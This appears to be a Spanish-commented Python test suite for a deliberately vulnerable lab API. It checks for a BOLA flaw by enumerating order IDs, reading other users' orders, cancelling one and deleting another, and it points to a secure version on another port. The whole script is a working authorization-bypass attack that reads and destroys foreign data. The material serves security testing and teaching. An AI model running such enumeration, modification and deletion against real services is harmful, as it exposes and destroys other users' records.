"""
Test suite para verificar la vulnerabilidad BOLA en la API
Actualizado para proyecto actual
"""


import requests
import argparse
from colorama import Fore, Style, init


init(autoreset=True)


def test_health(base_url):
    """Test 0: Verificar que la API está funcionando"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print("TEST 0: Health Check")
    print(f"{'='*60}{Style.RESET_ALL}")
   
    try:
        response = requests.get(f"{base_url}/health", timeout=5)
        if response.status_code == 200:
            data = response.json()
            print(f"{Fore.GREEN}✅ PASS: API saludable - {data.get('status', 'N/A')}")
            return True
        else:
            print(f"{Fore.RED}❌ FAIL: Health check falló")
            return False
    except Exception as e:
        print(f"{Fore.RED}❌ FAIL: No se puede conectar a la API - {str(e)}")
        return False


def get_token(base_url):
    """Obtener token de autenticación"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print("TEST 1: Autenticación")
    print(f"{'='*60}{Style.RESET_ALL}")
   
    try:
        response = requests.post(
            f"{base_url}/api/auth/login",
            json={"email": "alice@example.com", "password": "password123"},
            timeout=10
        )
       
        if response.status_code == 200:
            data = response.json()
            token = data.get('token')
            if token:
                print(f"{Fore.GREEN}✅ PASS: Autenticación exitosa")
                return {
                    'token': token,
                    'user': data.get('user', {})
                }
            print(f"{Fore.RED}❌ FAIL: La respuesta no contiene token")
            return None
        else:
            print(f"{Fore.RED}❌ FAIL: Error en autenticación - {response.status_code}")
            return None
    except Exception as e:
        print(f"{Fore.RED}❌ FAIL: Error de conexión - {str(e)}")
        return None


def test_own_orders(token, base_url, context):
    """Test 2: Usuario puede ver sus propias órdenes"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print("TEST 2: Acceso a órdenes propias")
    print(f"{'='*60}{Style.RESET_ALL}")
   
    headers = {"Authorization": f"Bearer {token}"}
    try:
        response = requests.get(f"{base_url}/api/orders", headers=headers, timeout=10)
       
        if response.status_code == 200:
            orders = response.json().get('orders', [])
            context['own_order_ids'] = [order.get('id') for order in orders if order.get('id') is not None]
            print(f"{Fore.GREEN}✅ PASS: Se obtuvieron {len(orders)} órdenes propias")
            return True
        else:
            print(f"{Fore.RED}❌ FAIL: No se pudieron obtener órdenes - {response.status_code}")
            return False
    except Exception as e:
        print(f"{Fore.RED}❌ FAIL: Error de conexión - {str(e)}")
        return False


def find_foreign_order(token, base_url, context, exclude_ids=None, max_id=50):
    """Buscar una orden que no pertenezca al usuario autenticado."""
    headers = {"Authorization": f"Bearer {token}"}
    own_user_id = context.get('user_id')
    own_order_ids = set(context.get('own_order_ids', []))
    exclude = set(exclude_ids or []) | own_order_ids

    cached_orders = context.setdefault('foreign_order_cache', [])
    for cached in cached_orders:
        if cached.get('id') not in exclude:
            return cached

    for order_id in range(1, max_id + 1):
        if order_id in exclude:
            continue
        try:
            response = requests.get(f"{base_url}/api/orders/{order_id}", headers=headers, timeout=10)
        except Exception:
            break

        if response.status_code != 200:
            continue

        order = response.json().get('order', {})
        owner_id = order.get('userId')

        if owner_id is None or owner_id == own_user_id:
            continue

        cached_orders.append(order)
        return order

    return None


def test_bola_vulnerability(token, base_url, context):
    """Test 3: Verificar vulnerabilidad BOLA"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print("TEST 3: Vulnerabilidad BOLA (Órdenes ajenas)")
    print(f"{'='*60}{Style.RESET_ALL}")
   
    order = find_foreign_order(token, base_url, context)

    if order:
        context['bola_order'] = order
        print(f"{Fore.RED}🚨 VULNERABILIDAD CONFIRMADA!")
        print(f"{Fore.YELLOW}La API permite acceder a órdenes de otros usuarios")
        print(f"\nDatos obtenidos:")
        print(f"  - Orden ID: {order.get('id', 'N/A')}")
        print(f"  - Producto: {order.get('product', 'N/A')}")
        print(f"  - Monto: ${order.get('amount', 'N/A')}")
        print(f"  - Dueño real (userId): {order.get('userId', 'N/A')}")
        return True

    print(f"{Fore.GREEN}✅ API segura: No fue posible acceder a órdenes ajenas")
    return False


def test_unauthorized_update(token, base_url, context):
    """Test 4: Intentar modificar orden ajena"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print("TEST 4: Modificación no autorizada")
    print(f"{'='*60}{Style.RESET_ALL}")
   
    headers = {"Authorization": f"Bearer {token}"}

    target_order = context.get('bola_order') or find_foreign_order(token, base_url, context)

    if not target_order:
        print(f"{Fore.GREEN}✅ Modificación bloqueada: No se hallaron órdenes ajenas accesibles")
        return False

    order_id = target_order.get('id')

    try:
        response = requests.put(
            f"{base_url}/api/orders/{order_id}",
            headers=headers,
            json={"status": "cancelled"},
            timeout=10
        )
       
        if response.status_code == 200:
            context['update_order'] = target_order
            print(f"{Fore.RED}🚨 VULNERABILIDAD: Se puede modificar órdenes ajenas (ID {order_id})")
            return True
        else:
            print(f"{Fore.GREEN}✅ Modificación bloqueada correctamente - {response.status_code}")
            return False
    except Exception as e:
        print(f"{Fore.RED}❌ FAIL: Error de conexión - {str(e)}")
        return False


def test_unauthorized_delete(token, base_url, context):
    """Test 5: Intentar eliminar orden ajena"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print("TEST 5: Eliminación no autorizada")
    print(f"{'='*60}{Style.RESET_ALL}")
   
    headers = {"Authorization": f"Bearer {token}"}

    exclude_ids = []
    if 'update_order' in context and context['update_order'].get('id') is not None:
        exclude_ids.append(context['update_order']['id'])

    target_order = find_foreign_order(token, base_url, context, exclude_ids=exclude_ids)

    if not target_order:
        target_order = context.get('bola_order')

    if not target_order:
        print(f"{Fore.GREEN}✅ Eliminación bloqueada: No se hallaron órdenes ajenas accesibles")
        return False

    order_id = target_order.get('id')

    try:
        response = requests.delete(f"{base_url}/api/orders/{order_id}", headers=headers, timeout=10)
       
        if response.status_code == 200:
            print(f"{Fore.RED}🚨 VULNERABILIDAD: Se puede eliminar órdenes ajenas (ID {order_id})")
            return True
        else:
            print(f"{Fore.GREEN}✅ Eliminación bloqueada correctamente - {response.status_code}")
            return False
    except Exception as e:
        print(f"{Fore.RED}❌ FAIL: Error de conexión - {str(e)}")
        return False


def main():
    parser = argparse.ArgumentParser(description='Test suite para API vulnerable')
    parser.add_argument('--target', type=str, required=True, help='IP del objetivo (ej: 192.168.1.100)')
    args = parser.parse_args()


    BASE_URL = f"http://{args.target}:3000"


    print(f"\n{Fore.YELLOW}{'='*60}")
    print("SUITE DE TESTS - API VULNERABLE (Puerto 3000)")
    print(f"Target: {BASE_URL}")
    print(f"{'='*60}{Style.RESET_ALL}\n")
   
    results = {
        'total': 0,
        'passed': 0,
        'failed': 0,
        'vulnerabilities': 0
    }
   
    # Verificar conectividad primero
    if not test_health(BASE_URL):
        print(f"{Fore.RED}No se puede continuar - API no disponible")
        return
   
    token_data = get_token(BASE_URL)
    if not token_data:
        print(f"{Fore.RED}No se puede continuar sin token de autenticación")
        return

    token = token_data['token']
    context = {
        'user_id': token_data.get('user', {}).get('id')
    }
   
    # Lista de tests
    tests = [
        test_own_orders,
        test_bola_vulnerability,
        test_unauthorized_update,
        test_unauthorized_delete
    ]
   
    for test in tests:
        results['total'] += 1
        try:
            if test(token, BASE_URL, context):
                results['passed'] += 1
                # Si es una prueba de vulnerabilidad y pasa, contar como vulnerabilidad
                if test.__name__ in ['test_bola_vulnerability', 'test_unauthorized_update', 'test_unauthorized_delete']:
                    results['vulnerabilities'] += 1
            else:
                results['failed'] += 1
        except Exception as e:
            print(f"{Fore.RED}❌ TEST ERROR: {str(e)}")
            results['failed'] += 1
   
    # Resumen
    print(f"\n{Fore.CYAN}{'='*60}")
    print("RESUMEN DE TESTS - API VULNERABLE")
    print(f"{'='*60}{Style.RESET_ALL}")
    print(f"Total de tests: {results['total']}")
    print(f"{Fore.GREEN}Tests pasados: {results['passed']}")
    print(f"{Fore.RED}Tests fallados: {results['failed']}")
    print(f"{Fore.RED}🚨 Vulnerabilidades encontradas: {results['vulnerabilities']}")
   
    if results['vulnerabilities'] > 0:
        print(f"\n{Fore.YELLOW}⚠️  Esta API es VULNERABLE y no debe usarse en producción")
    else:
        print(f"\n{Fore.GREEN}✅ Esta API está protegida contra BOLA")
   
    print(f"\n{Fore.CYAN}Recomendación: Prueba la API segura en puerto 3001{Style.RESET_ALL}\n")


if __name__ == "__main__":
    main()
